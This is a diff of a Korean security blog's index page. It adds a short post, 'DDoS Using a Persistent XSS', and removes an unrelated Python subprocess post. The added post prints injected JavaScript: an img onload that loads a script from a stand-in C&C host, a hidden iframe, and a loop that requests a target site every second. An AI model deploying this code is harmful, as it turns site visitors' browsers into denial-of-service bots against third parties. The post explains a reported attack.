@@ -9,7 +9,8 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="CVE-2014-0322 &lsquo;Snowman&rsquo; exploit crash 를 유발하는 JS. &lt;script&gt; function dword2data(dword) { var d = Number(dword).toString(16); while (d &hellip;">
+  <meta name="description" content="Vulnerability in World Largest Video Site Turned Million of Visitors into DDoS Zombies // JS injection in &lt;img&gt; tag enabled by Persistent XSS
+& &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -65,6 +66,57 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/05/14/ddos-using-a-persistent-xss/">DDoS Using a Persistent XSS</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-05-14T11:48:16+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>11:48 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://thehackernews.com/2014/04/vulnerability-in-worlds-largest-site.html">Vulnerability in World Largest Video Site Turned Million of Visitors into DDoS Zombies</a></p>
+
+<pre><code>// JS injection in &lt;img&gt; tag enabled by Persistent XSS
+&lt;img src="/imagename.jpg" onload="$.getScript('http://c&amp;cdomain.com/inject-iframe.html')&gt;
+
+// inject-iframe.html
+// Malicious JS opens hidden &lt;iframe&gt;
+$("body").append("&lt;iframe id='ifr11323' style='display:none;' src='http://c&amp;cdomain.com/ddos.html'&gt;&lt;/iframe&gt;");
+
+// ddos.html
+// Ajax DDoS script
+&lt;html&gt;&lt;body&gt;
+&lt;h1&gt;iframe&lt;/h1&gt;
+&lt;script&gt;
+ddos('http://www.target1.com');
+function ddos(url) {
+    window.setInterval( function() { $.getScript(url); }, 1000);
+}
+&lt;/script&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+
+<p>사람들의 방문이 많은 사이트에 자바스크립트를 업로드할 수 있다면, 방문자의 브라우저를 DDoS 좀비로 만들 수 있다.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -961,70 +1013,6 @@ adb shell pm install /sdcard/com.babo.babophone-1.apk
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/04/10/non-blocking-read-on-a-subprocess-dot-pipe-in-python/">Non-blocking Read on a subprocess.PIPE in Python</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-04-10T21:38:31+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>9:38 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><pre><code>p = subprocess.Popen('myprogram', stdout = subprocess.PIPE)
-str = p.stdout.readline()
-</code></pre>
-
-<p>로 해서 <code>readline()</code> 에서 hang 이 걸리는 경우를 당했다.</p>
-
-<p><a href="http://stackoverflow.com/questions/375427/non-blocking-read-on-a-subprocess-pipe-in-python">Non-blocking read on a subprocess.PIPE in python</a> 을 읽고 해결책을 찾았다.</p>
-
-<pre><code>import sys
-from subprocess import PIPE, Popen
-from threading import Thread
-
-try:
-    from Queue import Queue, Empty
-except ImportError:
-    from queue import Queue, Empty
-
-ON_POSIX = 'posix' in sys.builtin_module_names
-
-def enqueue_output(out, queue):
-    for line in iter(out.readline, b''):
-        queue.put(line)
-    out.close()
-
-p = Popen(['myprogram'], stdout=PIPE, bufsize=1, close_fds=ON_POSIX)
-q = Queue()
-t = Thread(target=enqueue_output, args=(p.stdout, q))
-t.daemon = True
-t.start()
-
-try: line = q.get_nowait()
-except Empty:
-    pass
-else:
-    yield line
-</code></pre>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/17">&larr; Older</a>
@@ -1042,6 +1030,10 @@ else:
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/04/26/rsa-sample-number/">RSA Sample Number</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/03/25/bleichenbacher/">Bleichenbacher</a>
       </li>
     
@@ -1055,10 +1047,6 @@ else:
     
       <li class="post">
         <a href="/blog/2016/02/16/plaid-ctf-2015-one-null-byte/">Plaid CTF 2015 - One NULL Byte</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/02/12/understanding-the-heap-and-exploiting-heap-overflows/">Understanding the Heap &amp; Exploiting Heap Overflows</a>
       </li>
     
   </ul>
